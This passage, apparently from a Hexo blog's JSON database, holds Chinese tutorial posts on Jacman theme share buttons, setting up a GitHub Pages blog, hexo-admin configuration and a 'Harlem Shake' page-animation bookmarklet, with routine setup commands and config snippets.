三、分享效果展示\n分享按钮样式：\n![jiathis分享](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share.png)\n\n内容分享给QQ好友：\n![分享给QQ好友](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share-qq.png)\n\n内容分享到微博：\n![分享到微博](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share-weibo.png)\n\n\n## 四、小结\n百度分享最大的一个优点在于更能提高在百度的搜索排名。另外，个人感觉百度分享生成代码过程更加友好。\n内容分享描述比较简单，仅仅只支持标题是硬伤。\n","slug":"article/hexo/jacman主题集成百度分享","published":1,"updated":"2016-03-31T15:06:28.000Z","_id":"cilpxkgbs004mavbtmc0lhfoz","comments":1,"layout":"post","photos":[],"link":""},{"title":"jacman主题开启jiathis分享","date":"2016-02-16T07:45:00.000Z","_content":"\n<img src=\"/asserts/images/logo/hexo.png\" class=\"img-logo img-center\" />\n\n\n## 一、前言\n本文内容基于wuchong的Jacman主题。\n\n### 1. 默认分享样式\n默认分享样式如下图所示：\n![默认分享](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-default-share.png)\n\n### 2. 代码位置\n分享按钮位置：themes/jacman/layout/_partial/post/footer.ejs\n代码块：\n``` html\n<div class=\"article-share\" id=\"share\">\n</div>\n```\n\n\n## 二、开启jiathis分享\njacman主题默认支持jiathis分享，只需要如下简单几步工作即可开启：\n\n### 1. 注册jiathis\n登录[jiathis网站](http://www.jiathis.com/)，完成注册。\n进入账号设置，在基本资料栏可以获取用户ID：2084038。\n\n### 2. 主题配置\n修改主题配置文件themes/jacman/_config.yml，如下：\n\n``` txt\n#### Share button\njiathis:\n  enable: true ## if you use jiathis as your share tool,the built-in share tool won't be display.\n  id: 2084038   ## e.g. 1889330 your jiathis ID.\n  tsina: 1873363984 ## e.g. 2176287895 Your weibo id,It will be used in share button.\n```\n\n**注**：enable, id, tsina前有二个空格(表示层级关系)，在代码里，可能通过theme.jiathis.enable获取其值。\n\n### 3. 代码逻辑\n代码：themes/jacman/layout/_partial/post/footer.ejs\n\njiathis分享相关代码逻辑：\n``` html\n<% if(theme.jiathis.enable){ %>\n<div class=\"share-jiathis\">\n  <%- partial('jiathis') %>\n </div>\n<% } else { %>\n  <div data-url=\"<%- item.permalink %>\" data-title=\"<% if (item.title){ %><%= item.title %> | <% } %><%= config.title %>\" data-tsina=\"<%= theme.author.tsina %>\" class=\"share clearfix\">\n  </div>\n<% } %>\n```\n\n**注**：`<%- partial('jiathis') %>`语法表示加载当前目录下的jiathis.ejs文件。\n\n### 4. 调整分享按钮顺序\n代码：themes/jacman/layout/_partial/post/jiathis.ejs\n\n调整后的顺序：\n``` html\n<div class=\"jiathis_style_24x24\">\n    <a class=\"jiathis_button_cqq\"></a>\n    <a class=\"jiathis_button_qzone\"></a>\n    <a class=\"jiathis_button_weixin\"></a>\n    <a class=\"jiathis_button_tsina\"></a>\n    <a class=\"jiathis_button_renren\"></a>\n    <a href=\"http://www.jiathis.com/share\" class=\"jiathis jiathis_txt jtico jtico_jiathis\" target=\"_blank\"></a>\n    <a class=\"jiathis_counter_style\"></a>\n</div>\n```\n\n\n## 三、分享效果展示\n分享按钮样式：\n![jiathis分享](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share.png)\n\n内容分享给QQ好友：\n![分享给QQ好友](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share-qq.png)\n\n内容分享到微博：\n![分享到微博](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share-weibo.png)\n\n\n## 四、小结\n\n### 1. 分享内容丰富\njiathis分享最大的一个优点在于主流的社交平台分享的内容更加丰富：描述会带上一部分正方内容，另外会附带上正文中的图片。\n\n### 2. 累计分享次数统计\n较多说分享而言，jiathis多出一个累计分享次数统计功能。\n较百度分享而言，找了好久才在别人的博客里找到百度分享累计分享次数的代码，未在百度分享网站显目位置有说明介绍。\n","source":"_posts/article/hexo/jacman主题开启jiathis分享.md","raw":"title: jacman主题开启jiathis分享\ntags:\n  - hexo\n  - 分享代码\ncategories:\n  - 博客搭建\ndate: 2016-02-16 15:45:00\n---\n\n<img src=\"/asserts/images/logo/hexo.png\" class=\"img-logo img-center\" />\n\n\n## 一、前言\n本文内容基于wuchong的Jacman主题。\n\n### 1. 默认分享样式\n默认分享样式如下图所示：\n![默认分享](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-default-share.png)\n\n### 2. 代码位置\n分享按钮位置：themes/jacman/layout/_partial/post/footer.ejs\n代码块：\n``` html\n<div class=\"article-share\" id=\"share\">\n</div>\n```\n\n\n## 二、开启jiathis分享\njacman主题默认支持jiathis分享，只需要如下简单几步工作即可开启：\n\n### 1. 注册jiathis\n登录[jiathis网站](http://www.jiathis.com/)，完成注册。\n进入账号设置，在基本资料栏可以获取用户ID：2084038。\n\n### 2. 主题配置\n修改主题配置文件themes/jacman/_config.yml，如下：\n\n``` txt\n#### Share button\njiathis:\n  enable: true ## if you use jiathis as your share tool,the built-in share tool won't be display.\n  id: 2084038   ## e.g. 1889330 your jiathis ID.\n  tsina: 1873363984 ## e.g. 2176287895 Your weibo id,It will be used in share button.\n```\n\n**注**：enable, id, tsina前有二个空格(表示层级关系)，在代码里，可能通过theme.jiathis.enable获取其值。\n\n### 3. 代码逻辑\n代码：themes/jacman/layout/_partial/post/footer.ejs\n\njiathis分享相关代码逻辑：\n``` html\n<% if(theme.jiathis.enable){ %>\n<div class=\"share-jiathis\">\n  <%- partial('jiathis') %>\n </div>\n<% } else { %>\n  <div data-url=\"<%- item.permalink %>\" data-title=\"<% if (item.title){ %><%= item.title %> | <% } %><%= config.title %>\" data-tsina=\"<%= theme.author.tsina %>\" class=\"share clearfix\">\n  </div>\n<% } %>\n```\n\n**注**：`<%- partial('jiathis') %>`语法表示加载当前目录下的jiathis.ejs文件。\n\n### 4. 调整分享按钮顺序\n代码：themes/jacman/layout/_partial/post/jiathis.ejs\n\n调整后的顺序：\n``` html\n<div class=\"jiathis_style_24x24\">\n    <a class=\"jiathis_button_cqq\"></a>\n    <a class=\"jiathis_button_qzone\"></a>\n    <a class=\"jiathis_button_weixin\"></a>\n    <a class=\"jiathis_button_tsina\"></a>\n    <a class=\"jiathis_button_renren\"></a>\n    <a href=\"http://www.jiathis.com/share\" class=\"jiathis jiathis_txt jtico jtico_jiathis\" target=\"_blank\"></a>\n    <a class=\"jiathis_counter_style\"></a>\n</div>\n```\n\n\n## 三、分享效果展示\n分享按钮样式：\n![jiathis分享](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share.png)\n\n内容分享给QQ好友：\n![分享给QQ好友](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share-qq.png)\n\n内容分享到微博：\n![分享到微博](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share-weibo.png)\n\n\n## 四、小结\n\n### 1. 分享内容丰富\njiathis分享最大的一个优点在于主流的社交平台分享的内容更加丰富：描述会带上一部分正方内容，另外会附带上正文中的图片。\n\n### 2. 累计分享次数统计\n较多说分享而言，jiathis多出一个累计分享次数统计功能。\n较百度分享而言，找了好久才在别人的博客里找到百度分享累计分享次数的代码，未在百度分享网站显目位置有说明介绍。\n","slug":"article/hexo/jacman主题开启jiathis分享","published":1,"updated":"2016-03-31T15:06:33.000Z","_id":"cilpxkgbu004savbtsfaowqa5","comments":1,"layout":"post","photos":[],"link":""},{"title":"hexo搭建github博客","date":"2015-12-29T06:04:00.000Z","_content":"\n<img src=\"/asserts/images/logo/blog.png\" class=\"img-logo img-center\" />\n\n\n## 一、创建Github Pages\nGithub Pages为我们提供静态页面的托管。\n参见：[一步步在GitHub上创建博客主页(2)](http://www.pchou.info/web-build/2013/01/05/build-github-blog-page-02.html)\n\n### 1. 注册github账号\n登录github.com，创建用户账号：yeshaoting。\n访问地址：https://github.com/yeshaoting\n\n### 2. 配置和使用github\n参见：[如何搭建一个独立博客——简明 Github Pages与 jekyll 教程](http://cnfeat.com/blog/2014/05/10/how-to-build-a-blog/)\n\n#### 生成新的SSH Key\n``` shell\nssh-keygen -t rsa -C \"yeshaoting@163.com\"\n```\n在~/.ssh目录会生成秘钥id_rsa，公钥id_rsa.pub\n\n#### 添加SSH key到github\n1) 查看并复制公钥id_rsa.pub内容。\n2) 登录github，在Accout Settings -> SSH Public Keys -> add another public keys\n3) 将复制id_rsa.pub内容复制到密钥文本框中。\n\n#### 测试\n``` shell\nssh -T git@github.com\n```\n\n<!-- more -->\n\n\n### 3. 创建项目仓库\n想建立个人博客，需要在github上建立yeshaoting.github.io的repository。\n其中，repository名必须是 **github账号名**.github.io，我的github账号是yeshaoting，所以若想创建一个github pages博客，repository必须是yeshaoting.github.io；否则，创建不成功。\n\n创建过程如下图所示：\n![github上建立仓库](http://cnfeat.qiniudn.com/13.png)\n\n\n## 二、安装hexo\nHexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。\n\n官方中文网址：https://hexo.io/zh-cn/\n\n参见：[如何搭建一个独立博客——简明 Github Pages与 jekyll 教程](http://cnfeat.com/blog/2014/05/10/how-to-build-a-blog/)\n\n### 1. 安装node js\n登录：https://nodejs.org/，并下载安装包。\n安装或解压node js到对应的目录 NODEJS_HOME。\n将 $NODEJS_HOME/bin 目录添加到系统环境变量PATH里。\n\n### 2. 安装hexo\nHexo的作者是tommy351，根据官方介绍，Hexo是一个简单、快速、强大的博客发布工具，支持Markdown格式。\n\n``` shell\nnpm install -g hexo-cli\n```\n\n## 三、建站\n创建hexo目录：hexo-blog\n\n\n## 初始化并安装hexo\n``` shell\ncd hexo-blog\nhexo init\nnpm install\n```\n\n新建完成后，指定文件夹的目录如下：\n```\n.\n├── _config.yml\n├── package.json\n├── scaffolds\n├── scripts\n├── source\n|   ├── _drafts\n|   └── _posts\n└── themes\n```\n\n目录结构说明如下：\n**_config.yml**\n网站的 配置 信息，您可以在此配置大部分的参数。\n\n**package.json**\n应用程序的信息。EJS, Stylus 和 Markdown renderer 已默认安装，您可以自由移除。\n\n**scaffolds**\n模版 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。\n\n**scripts**\n脚本 文件夹。脚本是扩展 Hexo 最简易的方式，在此文件夹内的 JavaScript 文件会被自动执行。\n\n**source**\n资源文件夹是存放用户资源的地方。除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。\n\n**themes**\n主题 文件夹。Hexo 会根据主题来生成静态页面。\n\n\n## 修改网站信息\n打开_config.yml，修改网站信息\n``` xml\n# Site\ntitle: 芳草地\nsubtitle: 叶绍亭\ndescription:\nauthor: yeshaoting\nlanguage: zh-CN\ntimezone: Asia/Shanghai\n```\n\n\n## 安装主题\n官方收纳的主题：http://hexo.io/themes/\n我选用 jacman 主题。\n点击进入http://wuchong.me/jacman/介绍页有相关的安装指南：[如何使用 Jacman 主题](http://wuchong.me/jacman/2014/11/20/how-to-use-jacman/)。\n\n**注**：下载完主题后，需要修改_config.yml文件，如下所示：\n``` shell\ntheme: jacman\nstylus:\n  compress: true\n```\n\n## 四、服务部署\n参见：[hexo官方网站](https://hexo.io/zh-cn/docs/)\nHexo 提供了快速方便的一键部署功能，让您只需一条命令就能将网站部署到服务器上。\n\n\n### 安装 hexo-deployer-git\n`npm install hexo-deployer-git --save`\n\n### 修改配置\n``` shell\n# Deployment\n## Docs: http://hexo.io/docs/deployment.html\ndeploy:\n  type: git\n  repo: git@github.com:yeshaoting/yeshaoting.github.io.git\n  branch: master\n```\n\n### 发布到github\nhexo deploy\n\n一般，之前需要生成静态文件hexo generate，\n而在生成静态文件前，可以先清理之前的静态文件hexo clean。\n\n\n## 五、本地预览\n\n## 安装 hexo-server\n`npm install hexo-server --save`\n\n## 启动服务\n\n### 默认端口为4000\nhexo server\n\n### 指定端口为5000\nhexo server -p 5000\n\n### 指定地址\nhexo server -i 192.168.1.1\n\n\n## 五、常用操作\n\n### 创建文章\nhexo new [layout] &lt;title>\n新建的文章默认会被保存在source/_posts文件夹。\n其中，layout默认为post，若指定，会在scaffolds文件夹找对应的布局文件。\n\n### 常用命令\n``` shell\nhexo new \"postName\" #新建文章\nhexo new page \"pageName\" #新建页面\nhexo generate #生成静态页面至public目录\nhexo server #开启预览访问端口（默认端口4000，'ctrl + c'关闭server）\nhexo deploy #将.deploy目录部署到GitHub\n```\n\n### 常用复合命令\n``` shell\nhexo d -g #生成加部署\nhexo s -g #预览加部署\n```\n\n### 简写\n``` shell\nhexo n == hexo new\nhexo g == hexo generate\nhexo s == hexo server\nhexo d == hexo deploy\n```","source":"_posts/article/hexo/hexo搭建github博客.md","raw":"title: hexo搭建github博客\ntags:\n  - hexo\ncategories:\n  - 博客搭建\ndate: 2015-12-29 14:04:00\n---\n\n<img src=\"/asserts/images/logo/blog.png\" class=\"img-logo img-center\" />\n\n\n## 一、创建Github Pages\nGithub Pages为我们提供静态页面的托管。\n参见：[一步步在GitHub上创建博客主页(2)](http://www.pchou.info/web-build/2013/01/05/build-github-blog-page-02.html)\n\n### 1. 注册github账号\n登录github.com，创建用户账号：yeshaoting。\n访问地址：https://github.com/yeshaoting\n\n### 2. 配置和使用github\n参见：[如何搭建一个独立博客——简明 Github Pages与 jekyll 教程](http://cnfeat.com/blog/2014/05/10/how-to-build-a-blog/)\n\n#### 生成新的SSH Key\n``` shell\nssh-keygen -t rsa -C \"yeshaoting@163.com\"\n```\n在~/.ssh目录会生成秘钥id_rsa，公钥id_rsa.pub\n\n#### 添加SSH key到github\n1) 查看并复制公钥id_rsa.pub内容。\n2) 登录github，在Accout Settings -> SSH Public Keys -> add another public keys\n3) 将复制id_rsa.pub内容复制到密钥文本框中。\n\n#### 测试\n``` shell\nssh -T git@github.com\n```\n\n<!-- more -->\n\n\n### 3. 创建项目仓库\n想建立个人博客，需要在github上建立yeshaoting.github.io的repository。\n其中，repository名必须是 **github账号名**.github.io，我的github账号是yeshaoting，所以若想创建一个github pages博客，repository必须是yeshaoting.github.io；否则，创建不成功。\n\n创建过程如下图所示：\n![github上建立仓库](http://cnfeat.qiniudn.com/13.png)\n\n\n## 二、安装hexo\nHexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。\n\n官方中文网址：https://hexo.io/zh-cn/\n\n参见：[如何搭建一个独立博客——简明 Github Pages与 jekyll 教程](http://cnfeat.com/blog/2014/05/10/how-to-build-a-blog/)\n\n### 1. 安装node js\n登录：https://nodejs.org/，并下载安装包。\n安装或解压node js到对应的目录 NODEJS_HOME。\n将 $NODEJS_HOME/bin 目录添加到系统环境变量PATH里。\n\n### 2. 安装hexo\nHexo的作者是tommy351，根据官方介绍，Hexo是一个简单、快速、强大的博客发布工具，支持Markdown格式。\n\n``` shell\nnpm install -g hexo-cli\n```\n\n## 三、建站\n创建hexo目录：hexo-blog\n\n\n## 初始化并安装hexo\n``` shell\ncd hexo-blog\nhexo init\nnpm install\n```\n\n新建完成后，指定文件夹的目录如下：\n```\n.\n├── _config.yml\n├── package.json\n├── scaffolds\n├── scripts\n├── source\n|   ├── _drafts\n|   └── _posts\n└── themes\n```\n\n目录结构说明如下：\n**_config.yml**\n网站的 配置 信息，您可以在此配置大部分的参数。\n\n**package.json**\n应用程序的信息。EJS, Stylus 和 Markdown renderer 已默认安装，您可以自由移除。\n\n**scaffolds**\n模版 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。\n\n**scripts**\n脚本 文件夹。脚本是扩展 Hexo 最简易的方式，在此文件夹内的 JavaScript 文件会被自动执行。\n\n**source**\n资源文件夹是存放用户资源的地方。除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。\n\n**themes**\n主题 文件夹。Hexo 会根据主题来生成静态页面。\n\n\n## 修改网站信息\n打开_config.yml，修改网站信息\n``` xml\n# Site\ntitle: 芳草地\nsubtitle: 叶绍亭\ndescription:\nauthor: yeshaoting\nlanguage: zh-CN\ntimezone: Asia/Shanghai\n```\n\n\n## 安装主题\n官方收纳的主题：http://hexo.io/themes/\n我选用 jacman 主题。\n点击进入http://wuchong.me/jacman/介绍页有相关的安装指南：[如何使用 Jacman 主题](http://wuchong.me/jacman/2014/11/20/how-to-use-jacman/)。\n\n**注**：下载完主题后，需要修改_config.yml文件，如下所示：\n``` shell\ntheme: jacman\nstylus:\n  compress: true\n```\n\n## 四、服务部署\n参见：[hexo官方网站](https://hexo.io/zh-cn/docs/)\nHexo 提供了快速方便的一键部署功能，让您只需一条命令就能将网站部署到服务器上。\n\n\n### 安装 hexo-deployer-git\n`npm install hexo-deployer-git --save`\n\n### 修改配置\n``` shell\n# Deployment\n## Docs: http://hexo.io/docs/deployment.html\ndeploy:\n  type: git\n  repo: git@github.com:yeshaoting/yeshaoting.github.io.git\n  branch: master\n```\n\n### 发布到github\nhexo deploy\n\n一般，之前需要生成静态文件hexo generate，\n而在生成静态文件前，可以先清理之前的静态文件hexo clean。\n\n\n## 五、本地预览\n\n## 安装 hexo-server\n`npm install hexo-server --save`\n\n## 启动服务\n\n### 默认端口为4000\nhexo server\n\n### 指定端口为5000\nhexo server -p 5000\n\n### 指定地址\nhexo server -i 192.168.1.1\n\n\n## 五、常用操作\n\n### 创建文章\nhexo new [layout] &lt;title>\n新建的文章默认会被保存在source/_posts文件夹。\n其中，layout默认为post，若指定，会在scaffolds文件夹找对应的布局文件。\n\n### 常用命令\n``` shell\nhexo new \"postName\" #新建文章\nhexo new page \"pageName\" #新建页面\nhexo generate #生成静态页面至public目录\nhexo server #开启预览访问端口（默认端口4000，'ctrl + c'关闭server）\nhexo deploy #将.deploy目录部署到GitHub\n```\n\n### 常用复合命令\n``` shell\nhexo d -g #生成加部署\nhexo s -g #预览加部署\n```\n\n### 简写\n``` shell\nhexo n == hexo new\nhexo g == hexo generate\nhexo s == hexo server\nhexo d == hexo deploy\n```","slug":"article/hexo/hexo搭建github博客","published":1,"updated":"2016-04-06T08:22:37.000Z","_id":"cilpxkgbw004wavbtn5tm7q0v","comments":1,"layout":"post","photos":[],"link":""},{"title":"hexo使用进阶","date":"2016-02-01T05:25:00.000Z","_content":"\n<img src=\"/asserts/images/logo/hexo.png\" class=\"img-logo img-center\" />\n\n\n## 一、后端管理插件hexo-admin\n插件可以直接在网页端创建、编辑markdown文章内容，并将内容发布到_posts里。\n另外，对我而言，最方便的是可以很方便的给文章加标题、分类、打标签。\n\n参见：\n - [An Admin Interface for Hexo](http://jaredforsyth.com/hexo-admin/)\n - [hexo-admin in github](https://github.com/jaredly/hexo-admin)\n\n### 1. 安装\n``` bash\nnpm install --save hexo-admin\nhexo server -d\nopen http://localhost:4000/admin/\n```\n\n### 2. 配置\n在_config.yml最后添加类似如下内容：\n``` xml\nadmin:\n  username: myfavoritename\n  password_hash: be121740bf988b2225a313fa1f107ca1\n  secret: a secret something\n```\n\nusername：后端登录用户名\npassword_hash：后端登录用户密码对应的md5 hash值\nsecret：用于保证cookie安全\n\n### 3. 预览\nhexo-admin界面如下：\n![screenshot-1](https://github.com/jaredly/hexo-admin/raw/master/docs/pasted-0.png?raw=true)\n![screenshot-2](https://raw.githubusercontent.com/jaredly/hexo-admin/master/docs/pasted-1.png)\n\n<!-- more -->\n\n\n## 二、Error with DTrace\nmac下默认安装使用hexo会报如下错误：\n``` bash\n{ [Error: Cannot find module './build/Release/DTraceProviderBindings'] code: 'MODULE_NOT_FOUND' }\n{ [Error: Cannot find module './build/default/DTraceProviderBindings'] code: 'MODULE_NOT_FOUND' }\n{ [Error: Cannot find module './build/Debug/DTraceProviderBindings'] code: 'MODULE_NOT_FOUND' }\n```\n\n#### 解决办法\n``` bash\nnpm install hexo --no-optional\n```\n\n参见：[Error with DTrace (Mac OS X)](https://hexo.io/docs/troubleshooting.html#Error_with_DTrace__28Mac_OS_X_29)\n\n\n## 三、hexo不支持的语法\n发现一例hexo不支持的行内代码语法：外层内容`${}`，内层内容以`#`开头。\n但是支持多行代码块，如下：\n``` bash\n${#arr[@]}\n${#arr[*]}\n```\n\n\n## 四、多分类支持不友好\n如果文章A设置有二个分类如：linux, shell(有先后顺序)，另一篇文章B设置有分类如：shell, bash(有先后顺序)。\n在分类里会生成四个分类linux(categories/linux), shell(categories/linux/shell), shell(categories/shell), bash(categories/shell/bash)。\n\n由此可见，对于一篇文章最好只设置一个分类，设置多个标签。\n\n\n## 五、文章更新时间显示\n修改只对于jacman主题而言。\n\n### 1. 添加文章更新时间显示位置\n文件：layout/_partial/post/header.ejs\n在article-time块内添加如下内容：\n``` xml\n    <time postupdated=\"<%= date_xml(item.updated) %>\" itemprop=\"dateModified\"> <%= __('dateModified') %> <%= item.updated.format(config.date_format) %></time>\n```\n\n### 2. 添加支持\n文件：languages/zh-CN.yml\n在最后添加如下内容：\n> dateModified: 更新于\n\n参见：\n - [hexo国际化（i18n）](https://hexo.io/zh-cn/docs/internationalization.html)\n - [hexo之jacman主题修改记录](https://blog.mcosx.cn/post/hexo-jacman/)\n\n","source":"_posts/article/hexo/hexo使用进阶.md","raw":"tags:\n  - hexo\ncategories:\n  - 博客搭建\ntitle: hexo使用进阶\ndate: 2016-02-01 13:25:00\n---\n\n<img src=\"/asserts/images/logo/hexo.png\" class=\"img-logo img-center\" />\n\n\n## 一、后端管理插件hexo-admin\n插件可以直接在网页端创建、编辑markdown文章内容，并将内容发布到_posts里。\n另外，对我而言，最方便的是可以很方便的给文章加标题、分类、打标签。\n\n参见：\n - [An Admin Interface for Hexo](http://jaredforsyth.com/hexo-admin/)\n - [hexo-admin in github](https://github.com/jaredly/hexo-admin)\n\n### 1. 安装\n``` bash\nnpm install --save hexo-admin\nhexo server -d\nopen http://localhost:4000/admin/\n```\n\n### 2. 配置\n在_config.yml最后添加类似如下内容：\n``` xml\nadmin:\n  username: myfavoritename\n  password_hash: be121740bf988b2225a313fa1f107ca1\n  secret: a secret something\n```\n\nusername：后端登录用户名\npassword_hash：后端登录用户密码对应的md5 hash值\nsecret：用于保证cookie安全\n\n### 3. 预览\nhexo-admin界面如下：\n![screenshot-1](https://github.com/jaredly/hexo-admin/raw/master/docs/pasted-0.png?raw=true)\n![screenshot-2](https://raw.githubusercontent.com/jaredly/hexo-admin/master/docs/pasted-1.png)\n\n<!-- more -->\n\n\n## 二、Error with DTrace\nmac下默认安装使用hexo会报如下错误：\n``` bash\n{ [Error: Cannot find module './build/Release/DTraceProviderBindings'] code: 'MODULE_NOT_FOUND' }\n{ [Error: Cannot find module './build/default/DTraceProviderBindings'] code: 'MODULE_NOT_FOUND' }\n{ [Error: Cannot find module './build/Debug/DTraceProviderBindings'] code: 'MODULE_NOT_FOUND' }\n```\n\n#### 解决办法\n``` bash\nnpm install hexo --no-optional\n```\n\n参见：[Error with DTrace (Mac OS X)](https://hexo.io/docs/troubleshooting.html#Error_with_DTrace__28Mac_OS_X_29)\n\n\n## 三、hexo不支持的语法\n发现一例hexo不支持的行内代码语法：外层内容`${}`，内层内容以`#`开头。\n但是支持多行代码块，如下：\n``` bash\n${#arr[@]}\n${#arr[*]}\n```\n\n\n## 四、多分类支持不友好\n如果文章A设置有二个分类如：linux, shell(有先后顺序)，另一篇文章B设置有分类如：shell, bash(有先后顺序)。\n在分类里会生成四个分类linux(categories/linux), shell(categories/linux/shell), shell(categories/shell), bash(categories/shell/bash)。\n\n由此可见，对于一篇文章最好只设置一个分类，设置多个标签。\n\n\n## 五、文章更新时间显示\n修改只对于jacman主题而言。\n\n### 1. 添加文章更新时间显示位置\n文件：layout/_partial/post/header.ejs\n在article-time块内添加如下内容：\n``` xml\n    <time postupdated=\"<%= date_xml(item.updated) %>\" itemprop=\"dateModified\"> <%= __('dateModified') %> <%= item.updated.format(config.date_format) %></time>\n```\n\n### 2. 添加支持\n文件：languages/zh-CN.yml\n在最后添加如下内容：\n> dateModified: 更新于\n\n参见：\n - [hexo国际化（i18n）](https://hexo.io/zh-cn/docs/internationalization.html)\n - [hexo之jacman主题修改记录](https://blog.mcosx.cn/post/hexo-jacman/)\n\n","slug":"article/hexo/hexo使用进阶","published":1,"updated":"2016-03-31T15:06:52.000Z","_id":"cilpxkgby004zavbt2dc9an2o","comments":1,"layout":"post","photos":[],"link":""},{"title":"Hello World","date":"2015-12-29T06:06:00.000Z","_content":"\n<img src=\"/asserts/images/logo/hexo.png\" class=\"img-logo img-center\" />\n\n\nWelcome to [Hexo](http://hexo.io/)! This is your very first post. Check [documentation](http://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](http://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](http://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](http://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](http://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](http://hexo.io/docs/deployment.html)\n","source":"_posts/article/hexo/hello-world.md","raw":"title: Hello World\ntags:\n  - hexo\ncategories:\n  - 博客搭建\ndate: 2015-12-29 14:06:00\n---\n\n<img src=\"/asserts/images/logo/hexo.png\" class=\"img-logo img-center\" />\n\n\nWelcome to [Hexo](http://hexo.io/)! This is your very first post. Check [documentation](http://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](http://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](http://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](http://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](http://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](http://hexo.io/docs/deployment.html)\n","slug":"article/hexo/hello-world","published":1,"updated":"2016-03-31T15:06:55.000Z","_id":"cilpxkgc00052avbt7ujlpb1i","comments":1,"layout":"post","photos":[],"link":""},{"title":"High一下","date":"2016-02-16T10:06:00.000Z","_content":"\n<img src=\"/asserts/images/logo/blog.png\" class=\"img-logo img-center\" />\n\n\n## 一、前言\n本文内容基于wuchong的Jacman主题。\n\n让网站元素动起来，从[酷壳](http://coolshell.cn/)网站抄过来的，套到hexo博客菜单里。\n\n\n## 二、代码\n代码：themes/jacman/layout/_partial/header.ejs\n\n找到 ==theme.menu== 位置，代码在菜单遍历输出后，添加如下代码：\n``` html\n<li><a title=\"把这个链接拖到你的Chrome收藏夹工具栏中\" href='javascript:(function(){function c(){var e=document.createElement(\"link\");e.setAttribute(\"type\",\"text/css\");e.setAt    tribute(\"rel\",\"stylesheet\");e.setAttribute(\"href\",f);e.setAttribute(\"class\",l);document.body.appendChild(e)}function h(){var e=document.getElementsByClassName(l);for(var t=0;t<e.length;t++){document    .body.removeChild(e[t])}}function p(){var e=document.createElement(\"div\");e.setAttribute(\"class\",a);document.body.appendChild(e);setTimeout(function(){document.body.removeChild(e)},100)}function d(e    ){return{height:e.offsetHeight,width:e.offsetWidth}}function v(i){var s=d(i);return s.height>e&amp;&amp;s.height<n&amp;&amp;s.width>t&amp;&amp;s.width<r}function m(e){var t=e;var n=0;while(!!t){n+=t    .offsetTop;t=t.offsetParent}return n}function g(){var e=document.documentElement;if(!!window.innerWidth){return window.innerHeight}else if(e&amp;&amp;!isNaN(e.clientHeight)){return e.clientHeight}re    turn 0}function y(){if(window.pageYOffset){return window.pageYOffset}return Math.max(document.documentElement.scrollTop,document.body.scrollTop)}function E(e){var t=m(e);return t>=w&amp;&amp;t<=b+w}    function S(){var e=document.createElement(\"audio\");e.setAttribute(\"class\",l);e.src=i;e.loop=false;e.addEventListener(\"canplay\",function(){setTimeout(function(){x(k)},500);setTimeout(function(){N();p    ();for(var e=0;e<O.length;e++){T(O[e])}},15500)},true);e.addEventListener(\"ended\",function(){N();h()},true);e.innerHTML=\" <p>If you are reading this, it is because your browser does not support the     audio element. We recommend that you get a new browser.</p> <p>\";document.body.appendChild(e);e.play()}function x(e){e.className+=\" \"+s+\" \"+o}function T(e){e.className+=\" \"+s+\" \"+u[Math.floor(Math.r    andom()*u.length)]}function N(){var e=document.getElementsByClassName(s);var t=new RegExp(\"\\\\b\"+s+\"\\\\b\");for(var n=0;n<e.length;){e[n].className=e[n].className.replace(t,\"\")}}var e=30;var t=30;var n    =350;var r=350;var i=\"//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake.mp3\";var s=\"mw-harlem_shake_me\";var o=\"im_first\";var u=[\"im_drunk\",\"im_baked\",\"im_trippin\",\"im_blown\"];var a=\"mw-st    robe_light\";var f=\"//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css\";var l=\"mw_added_css\";var b=g();var w=y();var C=document.getElementsByTagName(\"*\");var k=null;for(var L=0;L<    C.length;L++){var A=C[L];if(v(A)){if(E(A)){k=A;break}}}if(A===null){console.warn(\"Could not find a node of the right size. Please try a different page.\");return}c();S();var O=[];for(var L=0;L<C.leng    